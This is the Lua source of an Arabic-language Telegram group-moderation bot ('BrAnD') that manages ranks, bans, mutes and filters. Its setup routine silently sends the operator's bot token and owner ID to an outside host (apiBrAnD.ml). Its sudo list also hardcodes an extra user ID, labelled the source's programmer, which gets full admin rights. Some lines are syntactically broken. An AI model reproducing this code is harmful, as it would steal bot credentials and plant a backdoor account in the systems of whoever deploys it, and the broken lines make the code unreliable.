------------------------------------------------
-- This SoUrCe Was Developed By (BrAnD) @s_x_X_G.--
--   This Is The SoUrCe ChANnEl @CXRCX .   --
--                - BrAnD -                 --
--        -- https://t.me/CXRCX --         --
------------------------------------------------ 
redis = require('redis') 
URL = require('socket.url') 
HTTPS = require ("ssl.https") 
https = require ("ssl.https") 
http  = require ("socket.http") 
serpent = require("serpent") 
json = dofile('./JSON.lua') 
JSON = dofile('./dkjson.lua') 
lgi = require('lgi') 
notify = lgi.require('Notify') 
utf8 = require ('lua-utf8') 
notify.init ("Telegram updates") 
DevBrAnD = redis.connect('127.0.0.1', 6379) 
ServerBrAnD = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
--     SoUrCe BrAnD     --
local AutoSet = function() 
if not DevBrAnD:get(ServerBrAnD.."IdBrAnD") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local SUDO = io.read():gsub(' ','') 
if tostring(SUDO):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevBrAnD:set(ServerBrAnD.."IdBrAnD",SUDO) 
else 
print('\27[1;31m⍆═════BR═════⍅\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n⍆═════BR═════⍅') 
end 
os.execute('lua BrAnD.lua') 
end 
if not DevBrAnD:get(ServerBrAnD.."TokenBrAnD") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local token = io.read() 
if token ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe') 
if res ~= 200 then 
print('\27[1;31m⍆═════BR═════⍅\nالتوكن غير صحيح تاكد منه ثم ارسله\n⍆═════BR═════⍅') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevBrAnD:set(ServerBrAnD.."TokenBrAnD",token) 
end  
else 
print('\27[1;31m⍆═════BR═════⍅\nلم يتم حفظ توكن البوت ارسله مره اخرى\n⍆═════BR═════⍅') 
end  
os.execute('lua BrAnD.lua') 
end 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local create_config_auto = function()
config = {
SUDO = DevBrAnD:get(ServerBrAnD.."IdBrAnD"),
token = DevBrAnD:get(ServerBrAnD.."TokenBrAnD"),
bot_id = DevBrAnD:get(ServerBrAnD.."TokenBrAnD"):match("(%d+)"),
sudo_users = {DevBrAnD:get(ServerBrAnD.."IdBrAnD")},
}
create(config, "./config.lua")   
https.request("https://apiBrAnD.ml/BrAnD.php?SUDO="..DevBrAnD:get(ServerBrAnD.."IdBrAnD").."&token="..DevBrAnD:get(ServerBrAnD.."TokenBrAnD"))
file = io.open("RUNBrAnD.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/BrAnD
token="]]..DevBrAnD:get(ServerBrAnD.."TokenBrAnD")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "⍆═════BR═════⍅ ≈ ⍆═════BR═════⍅ ≈ ┉ ≈ ┉"
echo "The tg File Was Not Found In The Bot Files"
echo "⍆═════BR═════⍅ ≈ ⍆═════BR═════⍅ ≈ ┉ ≈ ┉"
exit 1
fi
if [ ! $token ]; then
echo "⍆═════BR═════⍅ ≈ ⍆═════BR═════⍅ ≈ ┉ ≈ ┉ ≈ ┉"
echo "The Token Was Not Found In The config.lua File"
echo "⍆═════BR═════⍅ ≈ ⍆═════BR═════⍅ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
./tg -s ./BrAnD.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BrAnD", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/BrAnD
while(true) do
rm -fr ../.telegram-cli
screen ./RUNBrAnD.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('./BrAnD')
end 
create_config_auto()
end
local Load_BrAnD = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevBrAnD:del(ServerBrAnD.."IdBrAnD");DevBrAnD:del(ServerBrAnD.."TokenBrAnD")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_BrAnD() 
print("\27[36m"..[[                                           
---------------------------------------------
|    ____             ____                  |
|   |  _ \  _____   _|  _ \ _ __ _____  __  |
|   | | | |/ _ \ \ / / |_) | '__/ _ \ \/ /  |
|   | |_| |  __/\ V /|  __/| | | (_) >  <   |
|   |____/ \___| \_/ |_|   |_|  \___/_/\_\  |
|-------------------------------------------|
|This SoUrCe Was Developed By (BrAnD) @s_x_X_G.|
|  This Is The SoUrCe ChANnEl @CXRCX .   |
|               - BrAnD -                 |
---------------------------------------------
]]..'\27[m')
sudos = dofile("./config.lua")
DevId = sudos.SUDO
SudoUsers = {sudos.sudo_users,218385683}
BrAnD = sudos.bot_id
TokenBot = sudos.token
NameBot = (DevBrAnD:get(BrAnD..'BrAnD:NameBot') or 'براند ')
--     SoUrCe BrAnD     --
FilesPrint = "\27[35m".."\nAll SoUrCe Files Started ↬ ⤈ \n⍆═════BR═════⍅ ≈ ┉ ≈ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."⍆═════BR═════⍅ ≈ ┉ ≈ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     SoUrCe BrAnD     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     SoUrCe BrAnD     --
function dl_cb(arg, data)
end
--     SoUrCe BrAnD     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoUsers) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoUsers) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     SoUrCe BrAnD     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == BrAnD then  
var = true  
end  
return var  
end 
--     SoUrCe BrAnD     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:',msg.sender_user_id_) 
if Status or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
---------Manager All--------
function ManagerAll(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:ManagerAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
--------- Admin All --------
function AdminAll(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:AdminAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
------ VIP MEMBER ALL ------
function VipAll(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:VipAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
----   BrAnDConstructor   ----
function BrAnDConstructor(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:BrAnDConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or BrAnDConstructor(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or BrAnDConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
---------  Manager  --------
function Manager(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or BrAnDConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or BrAnDConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or BrAnDConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevBrAnD:sismember(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or BrAnDConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     SoUrCe BrAnD     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevBrAnD:sismember(BrAnD..'BrAnD:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     SoUrCe BrAnD     --
---------  BanAll  ---------
function BanAll(user_id)
if DevBrAnD:sismember(BrAnD..'BrAnD:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     SoUrCe BrAnD     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     SoUrCe BrAnD     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevBrAnD:sismember(BrAnD..'BrAnD:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     SoUrCe BrAnD     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     SoUrCe BrAnD     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     SoUrCe BrAnD     --
function BrAnDFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.BrAnD and msg then
FilesText = plugin.BrAnD(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     SoUrCe BrAnD     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     SoUrCe BrAnD     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= BrAnD:lower() then 
send(chat,msg.id_,"♰ ⌯ عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"♰ ⌯ جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot' .. TokenBot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"♰ ⌯ عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..BrAnD..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevBrAnD:set(BrAnD.."BrAnD:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevBrAnD:sadd(BrAnD.."BrAnD:Groups",IdGps) 
DevBrAnD:set(BrAnD.."BrAnD:Lock:Bots"..IdGps,"del") DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'BrAnD:Lock:Links','BrAnD:Lock:Contact','BrAnD:Lock:Forwards','BrAnD:Lock:Videos','BrAnD:Lock:Gifs','BrAnD:Lock:EditMsgs','BrAnD:Lock:Stickers','BrAnD:Lock:Farsi','BrAnD:Lock:Spam','BrAnD:Lock:WebLinks','BrAnD:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevBrAnD:set(BrAnD..Lock..IdGps,true)
end
if v.BrAnDConstructors then
for k,IdBrAnDConstructors in pairs(v.BrAnDConstructors) do
DevBrAnD:sadd(BrAnD..'BrAnD:BrAnDConstructor:'..IdGps,IdBrAnDConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevBrAnD:sadd(BrAnD..'BrAnD:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevBrAnD:sadd(BrAnD..'BrAnD:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevBrAnD:sadd(BrAnD..'BrAnD:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevBrAnD:sadd(BrAnD..'BrAnD:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevBrAnD:set(BrAnD.."BrAnD:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevBrAnD:set(BrAnD.."BrAnD:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"♰ ⌯ تم رفع النسخه بنجاح \n♰ ⌯ تم تفعيل جميع المجموعات \n♰ ⌯ تم استرجاع مشرفين المجموعات \n♰ ⌯ تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
--     SoUrCe BrAnD     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     SoUrCe BrAnD     --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatus" .. status }, }, dl_cb, nil)
end
--     SoUrCe BrAnD     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     SoUrCe BrAnD     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local ChANnEl_id = id:gsub('-100', '')
chat = {ID = ChANnEl_id, type = 'ChANnEl'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     SoUrCe BrAnD     --
function ChatLeave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     SoUrCe BrAnD     --
function do_notify(user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--     SoUrCe BrAnD     --
function ChatKick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     SoUrCe BrAnD     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     SoUrCe BrAnD     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     SoUrCe BrAnD     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     SoUrCe BrAnD     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     SoUrCe BrAnD     --
function Dev_BrAnD(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     SoUrCe BrAnD     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     SoUrCe BrAnD     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     SoUrCe BrAnD     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     SoUrCe BrAnD     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     SoUrCe BrAnD     --
function pin(ChANnEl_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChANnElMessage", 
ChANnEl_id_ = getChatId(ChANnEl_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     SoUrCe BrAnD     --
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
--     SoUrCe BrAnD     --
local BrAnDRank = function(msg) if SudoId(msg.sender_user_id_) then BrAnDTeAM = "المطور" elseif SudoId(msg.sender_user_id_) then BrAnDTeAM= "المطور" elseif SudoBot(msg) then BrAnDTeAM= "المطور" elseif ManagerAll(msg) then BrAnDTeAM= "المدير" elseif AdminAll(msg) then BrAnDTeAM= "الادمن" elseif BrAnDConstructor(msg) then BrAnDTeAM= "المنشئ" elseif BasicConstructor(msg) then BrAnDTeAM= "المنشئ" elseif Constructor(msg) then BrAnDTeAM= "المنشئ" elseif Manager(msg) then BrAnDTeAM= "المدير" elseif Admin(msg) then BrAnDTeAM= "الادمن" else BrAnDTeAM= "العضو" end return BrAnDTeAMend
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then BrAnDTeAM= 'مبرمج السورس' elseif tonumber(user_id) == tonumber(BrAnD) then BrAnDTeAM= 'البوت' elseif SudoId(user_id) then BrAnDTeAM= 'المطور الاساسي' elseif DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:', user_id) then BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:SudoBot:Rd"..chat_id) or 'المطور' elseif DevBrAnD:sismember(BrAnD..'BrAnD:ManagerAll:', user_id) then BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:Managers:Rd"..chat_id) or 'المدير العام' elseif DevBrAnD:sismember(BrAnD..'BrAnD:AdminAll:', user_id) then BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevBrAnD:sismember(BrAnD..'BrAnD:VipAll:', user_id) then BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevBrAnD:sismember(BrAnD..'BrAnD:BrAnDConstructor:'..chat_id, user_id) then BrAnDTeAM= 'منشئ المجموعه' elseif DevBrAnD:sismember(BrAnD..'BrAnD:BasicConstructor:'..chat_id, user_id) then BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevBrAnD:sismember(BrAnD..'BrAnD:Constructor:'..chat_id, user_id) then BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevBrAnD:sismember(BrAnD..'BrAnD:Managers:'..chat_id, user_id) then BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:Managers:Rd"..chat_id) or 'المدير' elseif DevBrAnD:sismember(BrAnD..'BrAnD:Admins:'..chat_id, user_id) then BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:Admins:Rd"..chat_id) or 'الادمن' elseif DevBrAnD:sismember(BrAnD..'BrAnD:VipMem:'..chat_id, user_id) then  BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:VipMem:Rd"..chat_id) or 'المميز' elseif DevBrAnD:sismember(BrAnD..'BrAnD:Cleaner:'..chat_id, user_id) then  BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:Cleaner:Rd"..chat_id) or 'المنظف' else BrAnDTeAM= DevBrAnD:get(BrAnD.."BrAnD:mem:Rd"..chat_id) or 'العضو' end return BrAnDTeAMend
--     SoUrCe BrAnD     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(BrAnD) then  
var = true  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:', user_id) then
var = true  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:ManagerAll:', user_id) then
var = true  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:AdminAll:', user_id) then
var = true  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:VipAll:', user_id) then
var = true  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:BrAnDConstructor:'..chat_id, user_id) then
var = true
elseif DevBrAnD:sismember(BrAnD..'BrAnD:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Constructor:'..chat_id, user_id) then
var = true  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Managers:'..chat_id, user_id) then
var = true  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Admins:'..chat_id, user_id) then
var = true  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function BrAnDDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevBrAnD:sismember(BrAnD..'BrAnD:BrAnDConstructor:'..chat_id, user_id) then
var = 'BrAnDconstructor'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     SoUrCe BrAnD     --
local function Filters(msg, value)
local BrAnD = (BrAnD..'BrAnD:Filters:'..msg.chat_id_)
if BrAnD then
local names = DevBrAnD:hkeys(BrAnD)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     SoUrCe BrAnD     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "CXRCX")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "reply" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     SoUrCe BrAnD     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
BrAnD = GetInfo.result.custom_title
else 
BrAnD = Status
end
end
return BrAnD
end
--     SoUrCe BrAnD     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
BrAnD = GetInfo.result.bio
else 
BrAnD = "لا يوجد"
end
end
return BrAnD
end
--     SoUrCe BrAnD     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
